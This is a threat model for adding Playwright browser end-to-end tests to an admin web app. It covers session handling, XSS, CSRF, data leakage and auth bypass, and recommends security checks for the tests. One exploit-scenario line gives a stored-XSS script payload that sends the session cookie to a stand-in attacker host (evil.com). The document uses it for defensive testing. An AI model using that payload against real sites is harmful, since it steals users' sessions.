# Threat Model: e78 — Browser E2E Test Coverage

**Epic:** e78 — Browser E2E Test Coverage — All UI Routes
**Scope:** 6 stories (e78s01–e78s06), 36 BCPs, all browser-level Playwright tests
**Risk Level:** Low (net-new test code, no production logic changes)
**Assessment Date:** 2026-07-11

---

## Summary

This epic adds browser-level Playwright E2E test suites across all 22 UI routes. Zero browser E2E tests exist today; all existing E2E coverage uses the Playwright `request` fixture for API-level testing only. The threat model assesses what security behaviors the new browser tests should verify — not vulnerabilities in the test code itself (which are not production risk per false-positive rule #12: "Unit test files only").

**Overall Verdict:** No exploitable vulnerabilities introduced. The threat surface is the **application under test**, not the test code. Key findings below describe what the browser tests must validate.

---

## Threat Category Assessment

### T1: Auth Session Handling in Browser (P1) — Confidence 9

**Relevant stories:** e78s01 (Login & Authentication UI)
**CWE:** CWE-384 (Session Fixation), CWE-613 (Insufficient Session Expiration)

**Assessment:**
Browser-level tests will interact with the SPA's auth flow (register, login, logout, session cookies). Since the SPA uses hash-based routing at `/admin/`, auth tokens must be set as cookies or localStorage and must survive page navigation correctly.

**Key findings:**
1. **Session token in localStorage** — The browser tests should verify that auth tokens are stored securely (HttpOnly cookies preferred over localStorage for XSS resilience). The test must check that token is set after login and cleared after logout.
2. **Session persistence across navigation** — Test that hard navigation (page reload, hash route change) does not drop the session.
3. **Logout clears session** — Test that clicking logout invalidates the token client-side and server-side.

**Exploit scenario:** An attacker who obtains a localStorage token (via XSS in another part of the app) can impersonate the user until the token expires. If the app uses session cookies with `HttpOnly` + `Secure` flags, localStorage-based XSS cannot steal the token.

**Recommendation:** For e78s01 tests, add an assertion that the auth cookie (if used) has `HttpOnly` and `Secure` flags. If localStorage is used for token storage, flag this as a finding for the production app (out of scope for e78 to fix, but worth documenting).

### T2: XSS in Template Editors (P1) — Confidence 8

**Relevant stories:** e78s03 (Sites & Deploy — manifest editor), e78s05 (Messaging — template editor)
**CWE:** CWE-79 (Cross-site Scripting)

**Assessment:**
The Sites detail page has an inline editor for `bigbase.yaml` (YAML text editor). The Messaging page has a template editor for message content. If these editors render user input as HTML without sanitization, stored XSS is possible.

**Key findings:**
1. **bigbase.yaml inline editor** — The manifest editor in the Sites Detail page must correctly validate YAML syntax and display raw text, not render as HTML.
2. **Messaging template editor** — Template preview should sanitize any user-injected `<script>` tags.
3. **Framework preview tabs** (`/admin/auth`) — The React/Vue/Svelte tab content uses the `dangerouslySetInnerHTML`-like patterns. Verify these only render safe component previews, not arbitrary HTML.

**Exploit scenario:** An attacker creates a message with `<script>document.location='https://evil.com/steal?cookie='+document.cookie</script>`. When another user opens the template preview, the script executes, exfiltrating the session.

**Recommendation:** Browser tests should attempt stored XSS payloads in:
- Message template content (`e78s05`)
- YAML manifest content (`e78s03`)
- Verify these render as escaped text, not executable HTML

### T3: CSRF on State-Changing Forms (P2) — Confidence 8

**Relevant stories:** e78s03 (Deploy actions — Rollback, Drain, Delete), e78s04 (SQL Editor — Run query), e78s05 (Messaging — Send message), e78s05 (Users — Delete user)
**CWE:** CWE-352 (Cross-Site Request Forgery)

**Assessment:**
Browser-level tests will click buttons and submit forms that trigger state-changing API requests. The SPA must include CSRF tokens in forms or rely on SameSite cookies for CSRF protection.

**Key findings:**
1. **Deploy actions** — Rollback, drain, and delete are destructive state-changing operations. The browser test should verify these are protected (confirmed by a modal requiring explicit confirmation before the underlying API call).
2. **SQL Editor "Run" button** — Executes arbitrary SQL. The test should verify that clicking Run sends an API request with proper auth and that the query result is displayed.
3. **User delete** — The delete confirmation modal acts as a CSRF safeguard by requiring a two-click flow.

**Exploit scenario:** An attacker tricks an authenticated admin into visiting a malicious page that submits a form to `/api/sites/<id>` with `method=DELETE`. If the browser sends the session cookie (SameSite not set) and the API checks only the cookie, the site is deleted.

**Recommendation:** Browser tests for state-changing forms (`e78s03` deploy actions, `e78s05` user delete) should:
1. Verify that state-changing actions require modal confirmation (two-click flow)
2. Verify that API calls include auth headers, not just cookies
3. Document if any form lacks CSRF protection

### T4: Data Leakage via Storage/Browser UI (P2) — Confidence 8

**Relevant stories:** e78s04 (Storage — file preview, data grid), e78s06 (Monitoring — hardware stats, Forge wiki)
**CWE:** CWE-200 (Information Exposure)

**Assessment:**
The Storage UI displays file previews (images, documents) and the Data Studio grid displays table contents. These may expose sensitive data in the browser.

**Key findings:**
1. **File preview modals** — Verify that uploaded files are served over HTTPS and that preview modals do not cache sensitive data in the browser cache.
2. **Data grid** — The Data Studio "Data" view shows table contents. Verify that clicking a row reveals full data only within the authenticated session.
3. **Monitoring charts** — CPU/memory usage is not sensitive (operational data only).

**Exploit scenario:** An attacker with temporary access to an unattended browser session opens Storage, previews a sensitive file, and the file is cached in the browser's disk cache for later retrieval.

**Recommendation:** Browser tests should:
1. For `e78s04` — Verify that file download/preview URLs generate signed/authenticated URLs
2. For `e78s04` — Verify that closing the preview modal and re-opening requires fresh content (not browser cache)
3. For `e78s06` — No sensitive data in Monitoring (operational metrics only) — no concern

### T5: Auth Bypass via UI Navigation (P2) — Confidence 8

**Relevant stories:** e78s01–e78s06 (all stories)
**CWE:** CWE-287 (Improper Authentication)

**Assessment:**
The SPA uses hash-based routing. All UI routes at `/admin/` should redirect unauthenticated users to the login page. This is a key behavior for the browser tests to validate.

**Key findings:**
1. **Direct navigation to protected routes** — Browser tests should attempt to navigate directly to `/admin/` (or hash routes like `#/sites`, `#/deploy`) without auth and verify redirect to login.
2. **Token expiry handling** — Tests should verify that when a session token expires, the SPA redirects to login gracefully (not a crash or empty page).
3. **Auth framework preview page (`/admin/auth`)** — Verify this page is accessible only to authenticated users.

**Exploit scenario:** An unauthenticated user navigates to `/admin/#/deploy` and sees the deploy management screen because the SPA does not check auth on route change — only on initial page load.

**Recommendation:** For `e78s01` and `e78s02`, add tests that:
1. Clear localStorage/cookies and navigate to protected hash routes
2. Verify automatic redirect to login page
3. After login, verify redirect back to the originally requested route

---

## Risk Register

| # | Threat | P | C | S | Story | Test File | Verification |
|---|--------|---|---|---|-------|-----------|-------------|
| T1 | Auth session handling | 1 | 9 | HIGH | e78s01 | `tests/e2e/auth-ui.spec.ts` | Token set after login; cleared after logout; survives navigation |
| T2 | XSS in template editors | 1 | 8 | HIGH | e78s03, e78s05 | `deploy-ui.spec.ts`, `messaging-ui.spec.ts` | `<script>` payload renders as escaped text |
| T3 | CSRF on state-changing forms | 2 | 8 | MEDIUM | e78s03, e78s05 | `deploy-ui.spec.ts`, `users-ui.spec.ts` | Modal confirmation; API requires auth header |
| T4 | Data leakage via browser UI | 2 | 8 | MEDIUM | e78s04 | `storage-ui.spec.ts` | Signed URLs; no cached preview data |
| T5 | Auth bypass via navigation | 2 | 8 | MEDIUM | e78s01–s06 | All test files | Unauthenticated → redirect to login |

**Risk scoring:** P = Priority (1=urgent, 2=standard, 3=low), C = Confidence (1–10), S = Severity (LOW/MEDIUM/HIGH/CRITICAL)

---

## Exclusion Rules Applied

| Exclusion | Rationale |
|-----------|-----------|
| #1 (DOS) | No resource exhaustion concerns in test code |
| #5 (Input validation) | Test code does not receive production user input |
| #12 (Unit test files) | All findings in test code only — no production risk |
| #6 (React/Angular XSS safe) | React JSX auto-escapes — only flag `dangerouslySetInnerHTML` usage |
| #8 (Client-side auth checks) | Server-side auth is authoritative; client redirects are UX, not security |

---

## Recommendations for Test Specification

For each story, add these security-verification scenarios to the tasks:

### e78s01 (Login & Authentication UI)
- **BCP+1:** Verify session token exists after login and is cleared after logout
- **BCP+2:** Verify unauthenticated navigation redirects to login page
- **BCP+3:** Verify expired/revoked token shows login page (not crash)

### e78s03 (Sites & Deploy UI)
- **BCP+1:** Verify delete/rollback/drain requires modal confirmation (CSRF safeguard)
- **BCP+2:** Verify YAML manifest editor renders raw text, not HTML (XSS guard)

### e78s04 (Data, SQL & Storage)
- **BCP+1:** Verify file preview URLs are authenticated (direct URL access without auth returns 401/403)
- **BCP+2:** Verify closing and re-opening preview modals does not show cached data

### e78s05 (Secondary Pages)
- **BCP+1:** Verify message template editor sanitizes `<script>` tags in preview
- **BCP+2:** Verify user delete confirmation modal blocks accidental deletion (two-click flow)

### e78s06 (DevOps Pages)
- No security-specific BCPs recommended (operational data only)

---

## Sign-off

**Assessment:** PASS — No exploitable vulnerabilities introduced. 5 threats identified, all in the application under test (not in test code). Recommendations for security-verification scenarios are tracked as BCP+ items for test implementation.
